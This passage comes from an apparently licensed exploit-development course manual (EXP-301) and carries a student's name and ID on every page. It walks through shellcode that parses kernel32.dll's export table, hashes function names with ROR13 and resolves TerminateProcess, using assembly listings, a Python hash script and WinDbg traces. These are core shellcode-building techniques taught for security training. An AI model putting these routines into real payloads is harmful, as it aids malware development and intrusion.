the NumberOfNames field. As the name suggests, this field contains the number of exported 
symbols. 
 
224 (PE-Portable-executable), https://www.aldeid.com/wiki/PE-Portable-executable 
225 (aldeid - PE-Portable-executable), https://www.aldeid.com/wiki/PE-Portable-executable#Export_Table 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
249 
This allows us to use the value now stored in ECX as a counter to parse the AddressOfNames 
array. 
Let’s continue going through the assembly instructions. We’ll move the value pointed to by EDI 
and the static offset of 0x20, which corresponds to the AddressOfNames field, into EAX. Since 
this is a RVA, we’ll add the base address of kernel32.dll to it in order to obtain the VMA of the 
AddressOfNames array. 
The final instruction in find_function stores the AddressOfNames VMA at an arbitrary offset from 
EBP. Currently, EBP contains a pointer to the stack, thanks to the mov ebp, esp instruction at the 
beginning of our shellcode. 
Our code then reaches the find_function_loop function, which begins with a conditional jump 
based on the value of ECX. This jump will be taken if ECX, which holds the number of exported 
symbols, is NULL. If that happens, it means that we have reached the end of the array without 
finding our symbol name. The ASM code can be reviewed below: 
    " find_function_loop:                "  # 
    "   jecxz find_function_finished    ;"  #   Jump to the end if ECX is 0 
    "   dec   ecx                       ;"  #   Decrement our names counter 
    "   mov   eax, [ebp-4]              ;"  #   Restore AddressOfNames VMA 
    "   mov   esi, [eax+ecx*4]          ;"  #   Get the RVA of the symbol name 
    "   add   esi, ebx                  ;"  #   Set ESI to the VMA of the current 
symbol name 
Listing 293 - Obtaining the symbol name in ESI 
If the ECX register is not NULL, we’ll decrement our counter (ECX) and retrieve the previously-
saved AddressOfNames virtual memory address. We can use the counter ECX as an index to the 
AddressOfNames array and multiply it by four, because each entry in the array is a DWORD. Next, 
we’ll save the RVA of the symbol name in ESI. Finally, we can obtain the VMA of the symbol name 
by adding the base address of kernel32.dll to the ESI register. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
250 
 
Figure 68: Find function logic 
With the logic of our assembly code addressed, let’s run our updated shellcode and try to follow it 
inside WinDbg. Once we reach our INT3 instruction, we’ll attempt to manually gather the RVA of 
the Export Directory Table to verify that our shellcode is working as expected. 
We can begin by gathering the offset to the start of the PE header from the beginning of the 
module, as follows: 
0:002> g 
(6b8.594): Break instruction exception - code 80000003 (first chance) 
eax=055812f2 ebx=00000000 ecx=011e0000 edx=011e0000 esi=011e0000 edi=011e0000 
eip=011e0000 esp=022bfe04 ebp=022bfe14 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
011e0000 cc              int     3 
 
0:002> lm m kernel32 
Browse full module list 
start    end        module name 
76e40000 76ed5000   KERNEL32   (pdb symbols)          
c:\symbols\kernel32.pdb\F8E18714F7AC4AD1AC00CC0C6D41DD991\kernel32.pdb 
 
0:002> dt ntdll!_IMAGE_DOS_HEADER 0x76e40000 
   +0x000 e_magic          : 0x5a4d 
   +0x002 e_cblp           : 0x90 
... 
   +0x03c e_lfanew         : 0n248 
 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
251 
0:002> ? 0n248 
Evaluate expression: 248 = 000000f8 
Listing 294 - Dumping the IMAGE_DOS_HEADER structure to obtain the offset to the PE header 
According to the output from Listing 294, the PE header can be found at offset 0xF8. Reviewing 
the PE header structure (_IMAGE_NT_HEADERS), we’ll notice the IMAGE_OPTIONAL_HEADER 
structure at offset 0x18: 
0:002> dt ntdll!_IMAGE_NT_HEADERS 0x76e40000 + 0xf8 
   +0x000 Signature        : 0x4550 
   +0x004 FileHeader       : _IMAGE_FILE_HEADER 
   +0x018 OptionalHeader   : _IMAGE_OPTIONAL_HEADER 
Listing 295 - Dumping the _IMAGE_NT_HEADERS structure 
The 
_IMAGE_OPTIONAL_HEADER 
structure 
contains 
another 
structure 
named 
_IMAGE_DATA_DIRECTORY226 at offset 0x60: 
0:002> dt ntdll!_IMAGE_OPTIONAL_HEADER 0x76e40000 + 0xf8 + 0x18 
   +0x000 Magic            : 0x10b 
   +0x002 MajorLinkerVersion : 0xc '' 
   +0x003 MinorLinkerVersion : 0xa '' 
... 
   +0x05c NumberOfRvaAndSizes : 0x10 
   +0x060 DataDirectory    : [16] _IMAGE_DATA_DIRECTORY 
Listing 296 - Dumping the _IMAGE_OPTIONAL_HEADER structure 
According to the output from Listing 296, the DataDirectory is an array of length 16. Each entry in 
this array is an _IMAGE_DATA_DIRECTORY structure. 
We can examine the _IMAGE_DATA_DIRECTORY structure prototype to discover that it is 
comprised of two DWORD fields, resulting in the structure’s 0x08 size: 
typedef struct _IMAGE_DATA_DIRECTORY { 
  DWORD VirtualAddress; 
  DWORD Size; 
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY; 
Listing 297 - Prototype of the _IMAGE_DATA_DIRECTORY structure 
We’ll find the _IMAGE_OPTIONAL_HEADER structure at offset 0x18 from the PE header. At offset 
0x60 from that, we’ll locate the first entry in the DataDirectory array, which holds information 
about the Export Directory Table. This information confirms that the shellcode uses the correct 
offset to fetch the EDT, 0x78. 
Even though the structure field is named VirtualAddress, this field contains the 
relative virtual address. 
 
226 (Microsoft - IMAGE_DATA_DIRECTORY structure), https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-
image_data_directory 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
252 
Let’s manually dump the structure inside WinDbg and get the RVA for the Export Directory Table. 
We can also use the display header (!dh)227 command in WinDbg, along with file headers 
argument (-f) to dump all the file header information. 
0:002> dt ntdll!_IMAGE_DATA_DIRECTORY 0x76e40000 + 0xf8 + 0x78 
   +0x000 VirtualAddress   : 0x75940 
   +0x004 Size             : 0xd1c0 
    
0:002> !dh -f kernel32 
 
File Type: DLL 
FILE HEADER VALUES 
     14C machine (i386) 
       6 number of sections 
57CF8F7A time date stamp Tue Sep  6 20:54:34 2016 
 
       0 file pointer to symbol table 
       0 number of symbols 
      E0 size of optional header 
    2102 characteristics 
            Executable 
            32 bit word machine 
            DLL 
 
OPTIONAL HEADER VALUES 
     10B magic # 
   12.10 linker version 
   82000 size of code 
   12000 size of initialized data 
       0 size of uninitialized data 
   1DF30 address of entry point 
    1000 base of code 
... 
    4140  DLL characteristics 
            Dynamic base 
            NX compatible 
            Guard 
   75940 [    D1C0] address [size] of Export Directory 
   85354 [     4EC] address [size] of Import Directory 
... 
Listing 298 - Getting the RVA of the EDT manually and using !dh 
We have obtained the relative virtual address for the Export Directory Table, so let’s determine if 
our shellcode retrieves the same value. We can single-step through the shellcode instructions 
inside WinDbg and check the value of EDI before adding the kernel32.dll base address to it. 
0:002> t 
eax=000000f8 ebx=76e40000 ecx=00000000 edx=011e0000 esi=008178a0 edi=00811ca8 
eip=011e0032 esp=022bfbe0 ebp=022bfe04 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
011e0032 8b7c0378        mov     edi,dword ptr [ebx+eax+78h] ds:0023:76e40170=00075940 
 
 
227 (Microsoft - WinDbg (!dh)), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-dh 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
253 
0:002> t 
eax=000000f8 ebx=76e40000 ecx=00000000 edx=011e0000 esi=008178a0 edi=00075940 
eip=011e0036 esp=022bfbe0 ebp=022bfe04 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
011e0036 01df            add     edi,ebx 
 
0:002> r edi 
edi=00075940 
Listing 299 - Getting the RVA of the EDT through our shellcode 
Excellent! Our shellcode gathered the correct relative virtual address of the Export Directory Table. 
Let’s continue to single step through the instructions. When we reach the find_function_finished 
function, we will inspect ESI, which should point to the last symbol name exported by kernel32.dll, 
as shown below:  
0:002> r 
eax=76eb71ec ebx=76e40000 ecx=00000620 edx=011e0000 esi=76ec2af4 edi=76eb5940 
eip=011e004e esp=022bfbe0 ebp=022bfe04 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
011e004e 61              popad 
 
0:002> da esi 
76ec2af4  "timeGetTime" 
Listing 300 - Getting the last symbol name exported by kernel32.dll 
So far our shellcode has successfully obtained the base address of kernel32.dll as well as the 
Export Directory Table and ArrayOfNames array. We can now proceed to determine a method that 
will allow us to parse the exported symbol names. 
7.4.2.1 Exercises 
1. 
Update the previous shellcode to include the assembly instructions to fetch the Export 
Directory Table and the ArrayOfNames array, as well as the last exported symbol name from 
kernel32.dll. 
2. 
Inside WinDbg, manually fetch the RVA of the Export Directory Table and confirm it using the 
display header (!dh) command. 
3. 
Single step through the updated shellcode instructions inside the debugger and verify that 
the RVA of the Export Directory Table is correct. 
4. 
Continue executing the shellcode and identify the first exported symbol name. 
7.4.3 Computing Function Name Hashes 
After obtaining the address to the ArrayOfNames array, we’re ready to parse it for the symbol we 
are interested in, namely TerminateProcess in this case. 
As mentioned earlier, we’ll use a hashing algorithm to search for this symbol in the array, rather 
than the string length or various parts of the symbol name. 
This algorithm produces the same result obtained by the GetProcAddress function mentioned 
earlier, and can be used for every DLL. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
254 
The hashing algorithm, typically found in most modern shellcodes, converts any string into a 
DWORD. This allows us to re-use the function for any given symbol we want. Over the years this 
algorithm has been shown to be collision-free, meaning that each string will generate a unique 
DWORD. 
Let’s examine the hashing algorithm one instruction at a time. The final step in our current 
shellcode fetches the first entry in ArrayOfNames and converts the RVA to a VMA with the ESI 
register pointing to the symbol name. Following that, we introduce three new functions, as shown 
below. 
    " compute_hash:                      "  # 
    "   xor   eax, eax                  ;"  #   NULL EAX 
    "   cdq                             ;"  #   NULL EDX 
    "   cld                             ;"  #   Clear direction 
 
    " compute_hash_again:                "  # 
    "   lodsb                           ;"  #   Load the next byte from esi into al 
    "   test  al, al                    ;"  #   Check for NULL terminator 
    "   jz    compute_hash_finished     ;"  #   If the ZF is set, we've hit the NULL 
term 
    "   ror   edx, 0x0d                 ;"  #   Rotate edx 13 bits to the right 
    "   add   edx, eax                  ;"  #   Add the new byte to the accumulator 
    "   jmp   compute_hash_again        ;"  #   Next iteration 
 
    " compute_hash_finished:             "  # 
Listing 301 - resolving_symbols_0x02.py: Hash Routines to Compute Function Names 
The compute_hash function starts with an XOR operation, which sets the EAX register to NULL. 
This instruction is followed by the CDQ228 instruction, which uses the NULL value in EAX to set 
EDX to NULL as well. 
The last instruction of this function is CLD,229 which clears the direction flag (DF) in the EFLAGS 
register. Executing this instruction will cause all string operations to increment the index registers, 
which are ESI (where our symbol name is stored) and/or EDI. 
We then reach the compute_hash_again function that starts with a LODSB230 instruction. This 
instruction will load a byte from the memory pointed to by ESI into the AL register and then 
automatically increment or decrement the register according to the DF flag. 
This is followed by a TEST instruction using the AL register as both operands. If AL is NULL, we 
will take the JZ conditional jump to the compute_hash_finished. This function doesn’t contain any 
instructions and is used as an indicator that we have reached the end of our symbol name. 
If AL is not NULL, we’ll arrive at a ROR231 bit-wise operation. This assembly instruction rotates the 
bits of the first operand to the right by the number of bit positions specified in the second 
operand. In our case, EDX is rotated right by 0x0D bits. 
 
228 (Faydoc - CDQ), http://faydoc.tripod.com/cpu/cdq.htm 
229 (Faydoc - CLD), http://faydoc.tripod.com/cpu/cld.htm 
230 (Faydoc - ROR), http://faydoc.tripod.com/cpu/ror.htm 
231 (Faydoc - ROR), http://faydoc.tripod.com/cpu/ror.htm 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
255 
To get a better understanding of how the rotate bits right instruction works, let’s try it out inside 
WinDbg. We will set EAX to a value we desire and execute a ror eax, 0x01 instruction. After we 
execute the instruction, we can view the result of the operation. 
We will use the assemble (a) command followed by the EIP register as the argument to place the 
ROR instruction right at the memory address where EIP is pointing to. Next, we can type the 
assembly instruction we wish to assemble, and after pressing I twice, the instruction will be 
placed in memory. 
0:002> r @eax=0x41 
 
0:002> a @eip 
02630000 ror eax, 0x01 
ror eax, 0x01 
02630002  
 
0:002> .formats @eax 
Evaluate expression: 
  Hex:     00000041 
  Decimal: 65 
  Octal:   00000000101 
  Binary:  00000000 00000000 00000000 01000001 
  Chars:   ...A 
  Time:    Wed Dec 31 16:01:05 1969 
  Float:   low 9.10844e-044 high 0 
  Double:  3.21143e-322 
 
0:002> t 
eax=80000020 ebx=00000000 ecx=02630000 edx=02630000 esi=02630000 edi=02630000 
eip=02630002 esp=0282f9fc ebp=0282fa0c iopl=0         ov up ei pl zr na pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000a47 
02630002 e581            in      eax,81h 
 
0:002> .formats @eax 
Evaluate expression: 
  Hex:     80000020 
  Decimal: -2147483616 
  Octal:   20000000040 
  Binary:  10000000 00000000 00000000 00100000 
  Chars:   ...  
  Time:    ***** Invalid 
  Float:   low -4.48416e-044 high -1.#QNAN 
  Double:  -1.#QNAN 
Listing 302 - Example of using the ROR assembly instruction inside WinDbg 
Listing 302 shows how the binary bits have rotated once to the right. Now that we understand 
how the ROR operation works, let’s get back to the shellcode and review the assembly code: 
    " compute_hash_again:                "  # 
    "   lodsb                           ;"  #   Load the next byte from esi into al 
    "   test  al, al                    ;"  #   Check for NULL terminator 
    "   jz    compute_hash_finished     ;"  #   If the ZF is set, we've hit the NULL 
term 
    "   ror   edx, 0x0d                 ;"  #   Rotate edx 13 bits to the right 
    "   add   edx, eax                  ;"  #   Add the new byte to the accumulator 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
256 
    "   jmp   compute_hash_again        ;"  #   Next iteration 
 
    " compute_hash_finished:             "  # 
Listing 303 - Hash Routines to Compute Function Names 
After the rotate bits right instruction, we’ll ADD the value of EAX, which holds a byte of our symbol 
name, to the EDX register and jump to the beginning of compute_hash_again. This function 
represents a loop that will go over each byte of a symbol name and add it to an accumulator 
(EDX) right after the rotate bits right operation. 
Once we reach the end of our symbol name, the EDX register will contain a unique four-byte hash 
for that symbol name. This means we can compare it to a pre-generated hash to determine if we 
have found the correct entry. 
We can write a simple Python script that performs the same operation so that we will be able to 
compute the hash of a function name that our shellcode will search for:232 
#!/usr/bin/python 
import numpy, sys 
 
def ror_str(byte, count): 
    binb = numpy.base_repr(byte, 2).zfill(32) 
    while count > 0: 
        binb = binb[-1] + binb[0:-1] 
        count -= 1 
    return (int(binb, 2)) 
 
if __name__ == '__main__': 
    try: 
        esi = sys.argv[1] 
    except IndexError: 
        print("Usage: %s INPUTSTRING" % sys.argv[0]) 
        sys.exit() 
 
    # Initialize variables 
    edx = 0x00 
    ror_count = 0 
 
    for eax in esi: 
        edx = edx + ord(eax) 
        if ror_count < len(esi)-1: 
            edx = ror_str(edx, 0xd) 
        ror_count += 1 
 
    print(hex(edx)) 
Listing 304 - ComputeHash.py: Python script to compute a four-byte hash from a string 
The script in Listing 304 takes the symbol name as an argument and replicates the hashing 
function from our assembly code, resulting in a four-byte hash of the symbol name. 
 
232 Please note that the ROR function in the script rotates bits using a string representation of a binary number. A correct 
implementation would use shift and or bitwise operators combined together (h<<5 | h>>27). The choice to use string operations is due 
to the fact that it is simpler to visualize bit rotations in this way for the student. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
257 
We can test our script by executing it and passing the timeGetTime string as an argument to 
generate the unique hash for the symbol. This was the last symbol name exported by kernel32.dll 
that we observed while running our previous shellcode inside WinDbg. 
C:\Users\admin\Desktop> python ComputeHash.py timeGetTime 
0x998eaf95 
Listing 305 - Unique hash for the timeGetTime string 
Let’s run our updated shellcode, which includes the hashing function, and confirm that the 
generated hash for the timeGetTime string matches the hash that will be generated by our 
assembly instructions. 
Rather than single-stepping through the entire shellcode, we’ll place software breakpoints at 
important parts of the code. To begin, let’s single step into find_function, as shown below: 
0:002> r 
eax=6f23d2c2 ebx=76e40000 ecx=00000000 edx=02a30000 esi=01276d78 edi=01271ca8 
eip=02a3002e esp=02c2f594 ebp=02c2f798 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
02a3002e 60              pushad 
 
0:002> u @eip L18 
02a3002e 60              pushad 
... 
02a30043 e319            jecxz   02a3005e 
02a30045 49              dec     ecx 
02a30046 8b45fc          mov     eax,dword ptr [ebp-4] 
02a30049 8b3488          mov     esi,dword ptr [eax+ecx*4] 
02a3004c 01de            add     esi,ebx 
02a3004e 31c0            xor     eax,eax 
02a30050 99              cdq 
02a30051 fc              cld 
02a30052 ac              lods    byte ptr [esi] 
02a30053 84c0            test    al,al 
02a30055 7407            je      02a3005e 
02a30057 c1ca0d          ror     edx,0Dh 
02a3005a 01c2            add     edx,eax 
02a3005c ebf4            jmp     02a30052 
02a3005e 61              popad 
02a3005f c3              ret 
 
0:002> bp 02a3004e  
 
0:002> bp 02a3005e  
 
0:002> bl 
     0 e Disable Clear  02a3004e     0001 (0001)  0:****  
     1 e Disable Clear  02a3005e     0001 (0001)  0:****  
Listing 306 - Setting up software breakpoints to compare the script generated hash inside WinDbg 
Listing 306 shows that we set up two software breakpoints. The first breakpoint is set after 
obtaining the RVA to the first entry in the AddressOfNames array, allowing us to confirm the 
symbol name that will be hashed. The second breakpoint is set after our compute_hash_again 
function has finished executing, allowing us to view the resultant hash in EDX. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
258 
0:002> g 
Breakpoint 0 hit 
eax=76eb71ec ebx=76e40000 ecx=00000620 edx=02a30000 esi=76ec2af4 edi=76eb5940 
eip=02a3004e esp=02c2f574 ebp=02c2f798 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
02a3004e 31c0            xor     eax,eax 
 
0:002> da @esi 
76ec2af4  "timeGetTime" 
 
0:002> g 
Breakpoint 1 hit 
eax=00000000 ebx=76e40000 ecx=00000620 edx=998eaf95 esi=76ec2b00 edi=76eb5940 
eip=02a3005e esp=02c2f574 ebp=02c2f798 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
02a3005e 61              popad 
 
0:002> r edx 
edx=998eaf95 
Listing 307 - Comparing the script-generated hash inside WinDbg 
Checking the output from Listing 307, the generated hash matches the one we obtained using our 
Python script. 
Now that we have implemented and tested our hashing algorithm inside of our shellcode, we can 
search for the TerminateProcess symbol and learn how to obtain its RVA and VMA inside our 
shellcode. 
7.4.3.1 Exercises 
1. 
Update your previous shellcode to include the functions needed for the hashing algorithm. 
2. 
Go through the assembly instructions to make sure you understand how the hashing 
functions work. 
3. 
Use the ComputeHash.py script to generate a unique hash for the timeGetTime string. 
4. 
Set breakpoints in the updated shellcode to quickly confirm that the hash from the script 
matches the one generated by our shellcode. 
7.4.4 Fetching the VMA of a Function 
Once we reach the final instruction of our previous shellcode, the computed hash is stored in the 
EDX register. This means we can introduce an additional function that will compare the hash 
from EDX with the one generated by our Python script. If the hashes match, we can re-use the 
same index from ECX in the AddressOfNameOrdinals array and gather the new index. This will 
allow us to obtain the RVA and, finally, VMA of the function. 
Let’s inspect our updated shellcode: 
import ctypes, struct 
from keystone import * 
 
CODE = ( 
    " start:                             "  # 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
259 
    "   int3                            ;"  #   Breakpoint for Windbg. REMOVE ME WHEN 
NOT DEBUGGING!!!! 
    "   mov   ebp, esp                  ;"  # 
    "   sub   esp, 0x200                ;"  # 
    "   call  find_kernel32             ;"  # 
    "   push  0x78b5b983                ;"  #   TerminateProcess hash 
    "   call  find_function             ;"  # 
    "   xor   ecx, ecx                  ;"  #   Null ECX 
    "   push  ecx                       ;"  #   uExitCode 
    "   push  0xffffffff                ;"  #   hProcess 
    "   call  eax                       ;"  #   Call TerminateProcess 
... 
    " find_function_loop:                "  # 
    "   jecxz find_function_finished    ;"  #   Jump to the end if ECX is 0 
    "   dec   ecx                       ;"  #   Decrement our names counter 
    "   mov   eax, [ebp-4]              ;"  #   Restore AddressOfNames VMA 
    "   mov   esi, [eax+ecx*4]          ;"  #   Get the RVA of the symbol name 
    "   add   esi, ebx                  ;"  #   Set ESI to the VMA of the current 
symbol name 
... 
    " compute_hash_again:                "  # 
    "   lodsb                           ;"  #   Load the next byte from esi into al 
    "   test  al, al                    ;"  #   Check for NULL terminator 
    "   jz    compute_hash_finished     ;"  #   If the ZF is set,we've hit the NULL 
term 
    "   ror   edx, 0x0d                 ;"  #   Rotate edx 13 bits to the right 
    "   add   edx, eax                  ;"  #   Add the new byte to the accumulator 
    "   jmp   compute_hash_again        ;"  #   Next iteration 
     
    " compute_hash_finished:             "  # 
 
    " find_function_compare:             "  # 
    "   cmp   edx, [esp+0x24]           ;"  #   Compare the computed hash with the 
requested hash 
    "   jnz   find_function_loop        ;"  #   If it doesn't match go back to 
find_function_loop 
... 
 
    " find_function_finished:            "  # 
    "   popad                           ;"  #   Restore registers 
    "   ret                             ;"  # 
Listing 308 - resolving_symbols_0x03.py: Comparing the generated hash with the static one and fetching the function 
VMA 
The first change in our shellcode can be observed in the start function. Before the call to 
find_function, we push the hash for TerminateProcess, which we generated using our Python 
script, on the stack. This allows us to later fetch it from the stack and compare it to the hash 
generated by our compute_hash_again function. 
After find_function returns, we push the two arguments that the target function requires on the 
stack, and call it using an indirect call to EAX. In order for this to work, we place the VMA of 
TerminateProcess in EAX before returning from find_function. 
Once our hash has been computed, we execute a newly-introduced function named 
find_function_compare, whose ASM code is shown below: 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
260 
    " find_function_compare:             "  # 
    "   cmp   edx, [esp+0x24]           ;"  #   Compare the computed hash with the 
requested hash 
    "   jnz   find_function_loop        ;"  #   If it doesn't match go back to 
find_function_loop 
    "   mov   edx, [edi+0x24]           ;"  #   AddressOfNameOrdinals RVA 
    "   add   edx, ebx                  ;"  #   AddressOfNameOrdinals VMA 
    "   mov   cx,  [edx+2*ecx]          ;"  #   Extrapolate the function's ordinal 
    "   mov   edx, [edi+0x1c]           ;"  #   AddressOfFunctions RVA 
    "   add   edx, ebx                  ;"  #   AddressOfFunctions VMA 
    "   mov   eax, [edx+4*ecx]          ;"  #   Get the function RVA 
    "   add   eax, ebx                  ;"  #   Get the function VMA 
    "   mov   [esp+0x1c], eax           ;"  #   Overwrite stack version of eax from 
pushad 
Listing 309 - Assembly code of find_function_compare function 
First, this function makes a comparison between EDX and the value pointed to by ESP at offset 
0x24. We’ll remember that the compute_hash_again function (Listing 308) uses EDX as an 
accumulator for our hash. For this comparison to work, we need to ensure that the memory 
address of ESP at offset 0x24 will point to the pre-generated hash we pushed. 
The offset required alongside the ESP register will vary depending on your 
shellcode and how many PUSH/POP operations it contains. To determine the 
exact offset, we used a dummy offset, and after running the shellcode, we used 
WinDbg to determine the exact value needed. 
If the compared hashes don’t match, we’ll jump back to find_function_loop and grab the next entry 
in the AddressOfNames array. Once we have found the correct entry, we gather the RVA of the 
AddressOfNameOrdinals array at offset 0x24 from the Export Directory Table, which is stored in 
EDI. The next instruction adds the base address of kernel32.dll stored in EBX to the RVA of 
AddressOfNameOrdinals. 
This is followed by the mov cx, [edx+2*ecx] instruction. ECX is also used as an index to the 
AddressOfNames array as part of our find_function_loop function. Because the AddressOfNames 
and AddressOfNameOrdinals arrays entries use the same index, once we find the entry for our 
symbol name, we can use the same index to retrieve the entry from the AddressOfNameOrdinals 
array. We multiply ECX by 0x02 because each entry in the array is a WORD. 
We then move the value from the AddressOfNameOrdinals array to the CX register, which was our 
counter/index. We’ll use this new value as a new index in the AddressOfFunctions array. Before 
using the new index, we gather the RVA of AddressOfFunctions at offset 0x1C from the Export 
Directory Table (mov edx, [edi+0x1c]), and then add the base address of kernel32.dll to it. 
Using our new index in the AddressOfFunctions array, we retrieve the RVA of the function and 
then finally add the base address of kernel32.dll to obtain the virtual memory address of the 
function. 
Let’s run the script and set a few breakpoints inside WinDbg to confirm we can successfully 
resolve the TerminateProcess function. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
261 
First, we’ll set a software breakpoint after the conditional jump inside find_function_compare, and 
let the shellcode run until we reach it: 
0:002> bp 02b40070  
 
0:002> g 
Breakpoint 0 hit 
eax=00000000 ebx=76e40000 ecx=0000056e edx=78b5b983 esi=76ec1b7e edi=76eb5940 
eip=02b40070 esp=02d3fd30 ebp=02d3ff58 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
02b40070 8b5724          mov     edx,dword ptr [edi+24h] ds:0023:76eb5964=00078a70 
 
0:002> u @eip La 
02b40070 8b5724          mov     edx,dword ptr [edi+24h] 
02b40073 01da            add     edx,ebx 
02b40075 668b0c4a        mov     cx,word ptr [edx+ecx*2] 
02b40079 8b571c          mov     edx,dword ptr [edi+1Ch] 
02b4007c 01da            add     edx,ebx 
02b4007e 8b048a          mov     eax,dword ptr [edx+ecx*4] 
02b40081 01d8            add     eax,ebx 
02b40083 8944241c        mov     dword ptr [esp+1Ch],eax 
02b40087 61              popad 
02b40088 c3              ret 
Listing 310 - Hitting the breakpoint after we have found our symbol name 
Once we hit our breakpoint, we’ll single step through the instructions until we finally obtain the 
virtual memory address of the TerminateProcess API: 
0:002> t 
eax=00000000 ebx=76e40000 ecx=0000056e edx=00078a70 esi=76ec1b7e edi=76eb5940 
eip=02b40073 esp=02d3fd30 ebp=02d3ff58 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
02b40073 01da            add     edx,ebx 
... 
 
0:002> t 
eax=76e6bd30 ebx=76e40000 ecx=0000056e edx=76eb5968 esi=76ec1b7e edi=76eb5940 
eip=02b40083 esp=02d3fd30 ebp=02d3ff58 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
02b40083 8944241c        mov     dword ptr [esp+1Ch],eax ss:0023:02d3fd4c=fa5da212 
 
0:002> u @eax 
KERNEL32!TerminateProcessStub: 
76e6bd30 8bff            mov     edi,edi 
76e6bd32 55              push    ebp 
76e6bd33 8bec            mov     ebp,esp 
76e6bd35 5d              pop     ebp 
76e6bd36 ff254c49ec76    jmp     dword ptr [KERNEL32!_imp__TerminateProcess 
(76ec494c)] 
76e6bd3c cc              int     3 
76e6bd3d cc              int     3 
76e6bd3e cc              int     3 
Listing 311 - Obtaining the virtual memory address of TerminateProcess 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
262 
Excellent! Our shellcode managed to successfully resolve the memory address of 
TerminateProcess. The last instruction in find_function_compare will write this virtual memory 
address to the stack at offset 0x1C. 
We do this to ensure that our address will be popped back into EAX after executing the POPAD 
instruction that is a part of find_function_finished before returning to our start function, as shown 
below: 
    " find_function_finished:            "  # 
    "   popad                           ;"  #   Restore registers 
    "   ret                             ;"  # 
Listing 312 - Assembly code of find_function_finished function 
Before proceeding, let’s quickly inspect the TerminateProcess233 function prototype: 
BOOL TerminateProcess( 
  HANDLE hProcess, 
  UINT   uExitCode 
); 
Listing 313 - The prototype of TerminateProcess 
After the RET instruction is executed, we return to the start function where we zero out ECX and 
push it onto the stack. This value will act as the uExitCode parameter and represents a successful 
exit. This is followed by a PUSH instruction that pushes the value -1 (0xFFFFFFFF) to the stack as 
the hProcess parameter. The minus one value represents a pseudo-handle234 to our process. 
0:002> t 
eax=76e6bd30 ebx=76e40000 ecx=00000000 edx=02b40000 esi=01307890 edi=01301c88 
eip=02b40018 esp=02d3fd54 ebp=02d3ff58 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
02b40018 31c9            xor     ecx,ecx 
 
0:002> t 
eax=76e6bd30 ebx=76e40000 ecx=00000000 edx=02b40000 esi=01307890 edi=01301c88 
eip=02b4001a esp=02d3fd54 ebp=02d3ff58 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
02b4001a 51              push    ecx 
 
0:002> t 
eax=76e6bd30 ebx=76e40000 ecx=00000000 edx=02b40000 esi=01307890 edi=01301c88 
eip=02b4001b esp=02d3fd50 ebp=02d3ff58 iopl=0         nv up ei pl zr na pe nc 
